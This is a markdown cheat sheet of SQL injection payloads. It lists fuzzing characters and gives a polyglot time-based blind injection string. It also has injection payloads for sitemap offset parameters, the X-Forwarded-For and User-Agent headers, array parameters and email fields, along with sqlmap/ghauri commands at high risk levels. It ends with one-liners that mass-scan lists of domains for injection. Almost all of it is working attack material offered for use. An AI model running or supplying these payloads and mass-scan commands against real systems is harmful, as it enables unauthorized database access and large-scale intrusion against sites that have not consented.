### Payloads
```

"
"'
' "
'"
'''
.
/
\
%5c
%27
%22
%23
%3B
%27%22%60
%22%27
%27%20%22
%27%22
%27%27%27
)
")
')
))
"))
'))
)))
#
;
''
`
,
""
//
\\
%
%00
||
0.or-1%23
'or-1%23
%2F
%5C
%29
%22%29
%27%29
%29%29
%22%29%29
%27%29%29
%27%27
%60
%60%60
%2C
%22%22
%2F%2F
%5C%5C
%7C%7C
28 %
%2A%7C
//*
%7C
29 %
(
*/*
|
*
*)(&
*)(|(&
*)(|(*
*))%00
-'
```

##### TOOLS
- sqlmap
- ghauri ==> this is best


### Ultiamte sql injection payload to test 
`IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
`
##### SITEMAP
- sitemap.xml is present? . Try setting ?offset=1 parameter and if content changes, run sqlmap or ghauri   
- payload for sitemap.xml ==>             target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#   ==> output time should be 9
- ```` sqlmap -u "target/sitemap.xml?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries"````

##### X-FORWARDED-FOR AND USER-AGENT
- X-Forwarded-For: ```` 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z````
- User-Agent: ````"XOR(if(now()=sysdate(),sleep(6),0))XOR"````

###### TIP: if login page is built with php , use user-agent payload
##### Also check injection in cookie 
---
#### Insert backslash in username and password parameter while creating account
`username=admin\&password=admin\` It may bypass some waf and also trigger error in sql syntax

##### IN PARAMETER
- testing in ?parameter=test by replacing below payload 
  ````?parameter[id) VALUES (NULL); WAITFOR DELAY '0:0:5';--]=test````
- sql injection in email parameter when email is send to check if it exists or not
   ```` 
   {“email”:”asd@a.com”}   response: {“code”:2002,”status”:200,”message”:”Email not found.”}
   {“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}   response:{“code”:0,”status”:200,”message”:”Successful”}	        Valid Delay: 8,696 milis

   `````



##### SQL IN MASS DOMAINS
````
cat domains.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(20),0))OR" -rt -timeout 20 -mrt '>20'
cat waybackurls.txt| grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

````


